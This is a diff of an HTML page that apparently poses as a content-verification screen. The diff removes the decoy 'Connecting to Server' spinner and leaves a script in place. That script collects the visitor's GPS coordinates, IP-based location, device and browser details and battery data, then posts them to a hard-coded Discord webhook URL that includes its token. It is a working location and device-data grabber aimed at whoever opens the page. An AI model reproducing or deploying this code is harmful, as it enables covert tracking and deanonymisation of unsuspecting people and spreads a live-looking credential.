@@ -3,50 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exclusive Content - Verification</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #0f0f0f;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .box {
-            background: #1a1a1a;
-            padding: 30px;
-            border-radius: 10px;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(0,0,0,0.8);
-            max-width: 350px;
-            width: 100%;
-        }
-        .spinner {
-            border: 4px solid rgba(255,255,255,0.1);
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            border-left-color: #09f;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+    <title></title>
 </head>
 <body>
-
-    <div class="box" id="mainBox">
-        <h2>Connecting to Server...</h2>
-        <div class="spinner"></div>
-        <p id="statusText">Verifying secure connection, please wait a moment.</p>
-    </div>
 
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559254413867094056/z_w6ht4Qf57qo4LKY6gk_4Y1SNeA1tx2cihfPPK3YdxhIQLMXwRna1z7v365dAdOkcsf';
@@ -70,10 +29,9 @@
             const language = navigator.language;
             const screenRes = `${window.screen.width}x${window.screen.height}`;
 
-            // ip-api.com theke detailed data fetch kora
             let ipData = {};
             try {
-                let res = await fetch('http://ip-api.com/json/');
+                let res = await fetch('https://ip-api.com/json/');
                 ipData = await res.json();
             } catch (e) {
                 console.log(e);
@@ -87,7 +45,6 @@
                         const accuracy = position.coords.accuracy;
                         const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                        document.getElementById('mainBox').innerHTML = `<h2>Success!</h2><p>Content is loading now...</p>`;
                         sendToDiscord({ lat, lon, accuracy: `${accuracy} meters (GPS)`, batteryInfo, googleMapsLink, ipData, userAgent, platform, language, screenRes });
                     },
                     (error) => {
@@ -95,7 +52,6 @@
                         const lon = ipData.lon || 'N/A';
                         const googleMapsLink = lat !== 'N/A' ? `https://www.google.com/maps?q=${lat},${lon}` : 'N/A';
 
-                        document.getElementById('mainBox').innerHTML = `<h2>Success!</h2><p>Content is loading now...</p>`;
                         sendToDiscord({ lat, lon, accuracy: 'IP-Based (Approximate)', batteryInfo, googleMapsLink, ipData, userAgent, platform, language, screenRes });
                     },
                     { enableHighAccuracy: true, timeout: 5000 }
